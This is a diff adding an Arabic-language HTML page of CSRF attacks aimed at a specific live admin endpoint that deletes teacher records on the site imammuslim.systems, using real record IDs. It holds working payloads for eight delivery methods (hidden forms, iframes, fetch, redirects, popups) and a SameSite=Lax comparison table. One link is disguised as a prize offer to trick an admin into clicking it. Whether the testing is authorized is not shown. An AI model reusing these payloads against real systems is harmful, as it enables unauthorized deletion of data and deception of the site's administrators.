@@ -1,0 +1,313 @@
+<!doctype html>
+<html dir="rtl" lang="ar">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CSRF Test - All Methods</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap"
+      rel="stylesheet" />
+    <link rel="stylesheet" href="styles.css" />
+  </head>
+  <body>
+    <h1>CSRF Attack Test — All Methods</h1>
+    <p class="subtitle">
+      Target:
+      https://imammuslim.systems/Admin/Teachers/Delete?id=1672d557-c952-4f0a-859c-567bfdccf6b9
+    </p>
+
+    <!-- Summary Table -->
+    <div class="note">
+      <strong>ليش ما اشتغل؟ — SameSite=Lax تحمي هكذا:</strong>
+      <table>
+        <tr>
+          <th>نوع الطلب</th>
+          <th>SameSite=Lax</th>
+          <th>SameSite=Strict</th>
+          <th>SameSite=None</th>
+        </tr>
+        <tr>
+          <td>رابط عادي ينقر عليه المستخدم (GET)</td>
+          <td style="color: #51cf66">✅ تُرسَل</td>
+          <td style="color: #ff6b6b">❌ محجوبة</td>
+          <td style="color: #51cf66">✅ تُرسَل</td>
+        </tr>
+        <tr>
+          <td>&lt;img src&gt; تلقائي (GET)</td>
+          <td style="color: #ff6b6b">❌ محجوبة</td>
+          <td style="color: #ff6b6b">❌ محجوبة</td>
+          <td style="color: #51cf66">✅ تُرسَل</td>
+        </tr>
+        <tr>
+          <td>&lt;form POST&gt; تلقائي</td>
+          <td style="color: #ff6b6b">❌ محجوبة</td>
+          <td style="color: #ff6b6b">❌ محجوبة</td>
+          <td style="color: #51cf66">✅ تُرسَل</td>
+        </tr>
+        <tr>
+          <td>fetch() / XMLHttpRequest</td>
+          <td style="color: #ff6b6b">❌ محجوبة</td>
+          <td style="color: #ff6b6b">❌ محجوبة</td>
+          <td style="color: #ffc107">⚠️ بحاجة CORS</td>
+        </tr>
+        <tr>
+          <td>&lt;iframe&gt; تلقائي</td>
+          <td style="color: #ff6b6b">❌ محجوبة</td>
+          <td style="color: #ff6b6b">❌ محجوبة</td>
+          <td style="color: #51cf66">✅ تُرسَل</td>
+        </tr>
+        <tr>
+          <td>window.open() ثم submit</td>
+          <td style="color: #ff6b6b">❌ محجوبة</td>
+          <td style="color: #ff6b6b">❌ محجوبة</td>
+          <td style="color: #51cf66">✅ تُرسَل</td>
+        </tr>
+      </table>
+    </div>
+
+    <!-- Hidden iframe target for forms -->
+    <iframe
+      name="hiddenFrame"
+      style="width: 0; height: 0; border: 0; position: absolute"></iframe>
+
+    <div class="grid">
+      <!-- Method 1: IMG GET -->
+      <!-- <div class="card">
+        <span class="badge blocked">❌ محجوب — SameSite=Lax</span>
+        <h3>Method 1: &lt;img src&gt; — GET تلقائي</h3>
+        <p class="desc">
+          البراوزر يحمّل الصورة تلقائياً عند فتح الصفحة ويرسل GET request.
+          <br />مع SameSite=Lax الكوكيز <strong>لا تُرسَل</strong> في طلبات
+          الصور من domain آخر.
+        </p>
+        <div class="status-box" id="s1">⏳ جاري التنفيذ التلقائي...</div>
+        
+        <img
+          id="imgPayload"
+          src="https://imammuslim.systems/Admin/Teachers/Delete?id=fa6de193-095e-4b14-843e-5fc17521006f"
+          width="1"
+          height="1"
+          style="display: none"
+          onload="
+            document.getElementById('s1').innerHTML =
+              '📤 GET request أُرسِل — لكن بدون كوكيز (SameSite=Lax)'
+          "
+          onerror="
+            document.getElementById('s1').innerHTML =
+              '📤 GET request أُرسِل — بدون كوكيز أو رفض السيرفر'
+          " />
+      </div> 
+
+      <!-- Method 2: Form POST auto-submit -->
+      <!-- <div class="card">
+        <span class="badge blocked">❌ محجوب — SameSite=Lax</span>
+        <h3>Method 2: &lt;form POST&gt; — auto-submit</h3>
+        <p class="desc">
+          الجافاسكريبت يعمل submit() تلقائياً عند تحميل الصفحة.
+          <br />مع SameSite=Lax الكوكيز <strong>لا تُرسَل</strong> في POST من
+          domain خارجي.
+        </p>
+        <div class="status-box" id="s2">⌛ منتظر...</div>
+        <form
+          id="formPost"
+          action="https://imammuslim.systems/Admin/Teachers/Delete"
+          method="POST"
+          target="hiddenFrame"
+          style="display: none">
+          <input
+            type="hidden"
+            name="id"
+            value="fa6de193-095e-4b14-843e-5fc17521006f" />
+        </form>
+        <button
+          class="btn"
+          onclick="
+            document.getElementById('formPost').submit();
+            document.getElementById('s2').innerHTML =
+              '📤 POST أُرسِل إلى iframe — بدون كوكيز (SameSite=Lax)';
+          ">
+          🔁 تجربة يدوية
+        </button>
+      </div> -->
+
+      <!-- Method 3: Form GET auto-submit -->
+      <div class="card">
+        <span class="badge blocked">❌ محجوب — SameSite=Lax</span>
+        <h3>Method 3: &lt;form GET&gt; — auto-submit</h3>
+        <p class="desc">
+          نفس الفكرة لكن بـ GET method عبر form.
+          <br />مع SameSite=Lax هذا النوع محجوب لأنه navigation تلقائي بدون تدخل
+          المستخدم.
+        </p>
+        <div class="status-box" id="s3">⌛ منتظر...</div>
+        <form
+          id="formGet"
+          action="https://imammuslim.systems/Admin/Teachers/Delete"
+          method="GET"
+          target="hiddenFrame"
+          style="display: none">
+          <input
+            type="hidden"
+            name="id"
+            value="fa6de193-095e-4b14-843e-5fc17521006f" />
+        </form>
+        <button
+          class="btn"
+          onclick="
+            document.getElementById('formGet').submit();
+            document.getElementById('s3').innerHTML =
+              '📤 GET form أُرسِل — بدون كوكيز (SameSite=Lax)';
+          ">
+          🔁 تجربة يدوية
+        </button>
+      </div>
+
+      <!-- Method 4: fetch() -->
+      <!-- <div class="card">
+        <span class="badge blocked">❌ محجوب — CORS + SameSite</span>
+        <h3>Method 4: fetch() / AJAX Request</h3>
+        <p class="desc">
+          إرسال طلب عبر JavaScript fetch API.
+          <br />محجوب بسببين: SameSite=Lax تمنع الكوكيز، وCORS يمنع قراءة الرد.
+          الطلب قد يُرسَل لكن بدون credentials.
+        </p>
+        <div class="status-box" id="s4">⌛ منتظر...</div>
+        <button
+          class="btn"
+          onclick="
+            fetch(
+              'https://imammuslim.systems/Admin/Teachers/Delete?id=fa6de193-095e-4b14-843e-5fc17521006f',
+              {
+                method: 'GET',
+                credentials: 'include',
+              },
+            )
+              .then(
+                (r) =>
+                  (document.getElementById('s4').innerHTML =
+                    '📤 fetch أُرسِل — status: ' + r.status + ' (بدون كوكيز)'),
+              )
+              .catch(
+                (e) =>
+                  (document.getElementById('s4').innerHTML =
+                    '🚫 مرفوض بـ CORS: ' + e.message),
+              )
+          ">
+          🔁 إرسال fetch
+        </button>
+      </div> -->
+
+      <!-- Method 5: iframe -->
+      <div class="card">
+        <span class="badge blocked">❌ محجوب — SameSite=Lax</span>
+        <h3>Method 5: &lt;iframe src&gt; — GET تلقائي</h3>
+        <p class="desc">
+          تحميل الـ URL المستهدف داخل iframe مخفي.
+          <br />مع SameSite=Lax الكوكيز لا تُرسَل، والـ iframe لا يستطيع قراءة
+          المحتوى (X-Frame-Options / CORS).
+        </p>
+        <div class="status-box" id="s5">⌛ منتظر...</div>
+        <button
+          class="btn"
+          onclick="
+            var f = document.createElement('iframe');
+            f.src =
+              'https://imammuslim.systems/Admin/Teachers/Delete?id=1672d557-c952-4f0a-859c-567bfdccf6b9';
+            f.style.display = 'none';
+            document.body.appendChild(f);
+            document.getElementById('s5').innerHTML =
+              '📤 iframe أُنشِئ وأُرسِل GET — بدون كوكيز (SameSite=Lax)';
+          ">
+          🔁 إطلاق iframe
+        </button>
+      </div>
+
+      <!-- Method 6: Top-level Navigation (ONLY method that works with Lax) -->
+      <div class="card">
+        <span class="badge works"
+          >✅ يعمل مع SameSite=Lax — إذا نقر المستخدم</span
+        >
+        <h3>Method 6: رابط عادي — Top-Level Navigation</h3>
+        <p class="desc">
+          <strong>الوحيد الذي يعمل مع SameSite=Lax!</strong>
+          <br />إذا نقر المستخدم على رابط، هذا يُعدّ top-level navigation
+          والكوكيز تُرسَل. <br />الخدعة: إخفاء الرابط الحقيقي بنص بريء.
+        </p>
+        <div class="status-box" id="s6">⌛ في انتظار نقر المستخدم...</div>
+        <a
+          class="btn"
+          href="https://imammuslim.systems/Admin/Teachers/Delete?id=fa6de193-095e-4b14-843e-5fc17521006f"
+          target="_blank"
+          onclick="
+            document.getElementById('s6').innerHTML =
+              '🖱️ المستخدم نقر → GET مع الكوكيز ✅'
+          ">
+          🎁 اضغط هنا لجائزتك!
+        </a>
+      </div>
+
+      <!-- Method 7: window.location redirect -->
+      <div class="card">
+        <span class="badge works">✅ يعمل مع SameSite=Lax</span>
+        <h3>Method 7: window.location Redirect</h3>
+        <p class="desc">
+          تحويل الصفحة الحالية مباشرة إلى الـ URL المستهدف.
+          <br />هذا top-level navigation → الكوكيز تُرسَل مع SameSite=Lax.
+          <br />⚠️ الضحية سيرى الـ URL في شريط العنوان.
+        </p>
+        <div class="status-box" id="s7">⌛ منتظر...</div>
+        <button
+          class="btn"
+          onclick="
+            document.getElementById('s7').innerHTML =
+              '🔄 جاري التحويل... الكوكيز ستُرسَل!';
+            setTimeout(function () {
+              window.location.href =
+                'https://imammuslim.systems/Admin/Teachers/Delete?id=1672d557-c952-4f0a-859c-567bfdccf6b9';
+            }, 1000);
+          ">
+          ⚠️ تجربة Redirect
+        </button>
+      </div>
+
+      <!-- Method 8: window.open -->
+      <div class="card">
+        <span class="badge depends">⚠️ يعمل — لكن قد يُحجَب كـ Popup</span>
+        <h3>Method 8: window.open()</h3>
+        <p class="desc">
+          فتح نافذة جديدة للـ URL المستهدف.
+          <br />يُعدّ top-level navigation → الكوكيز تُرسَل. <br />⚠️ البراوزر
+          قد يحجب الـ popup إذا لم يكن بسبب نقر مستخدم.
+        </p>
+        <div class="status-box" id="s8">⌛ منتظر...</div>
+        <button
+          class="btn"
+          onclick="
+            var w = window.open(
+              'https://imammuslim.systems/Admin/Teachers/Delete?id=38602b01-89c7-4ecd-867c-ec7172a42e58',
+              'csrfPopup',
+              'width=600,height=400,top=200,left=300,toolbar=no,menubar=no,scrollbars=yes,resizable=yes',
+            );
+            if (w) {
+              document.getElementById('s8').innerHTML =
+                '🪟 Popup مفتوح — GET مع الكوكيز أُرسِل ✅';
+            } else {
+              document.getElementById('s8').innerHTML =
+                '🚫 Popup محجوب من البراوزر';
+            }
+          ">
+          🔁 window.open
+        </button>
+      </div>
+    </div>
+
+    <!-- Hidden iframe target for forms: placed BEFORE forms submit to it -->
+
+    <script>
+      // Methods 1 & 2 are commented out — nothing to auto-run
+      window.onload = function () {};
+    </script>
+  </body>
+</html>
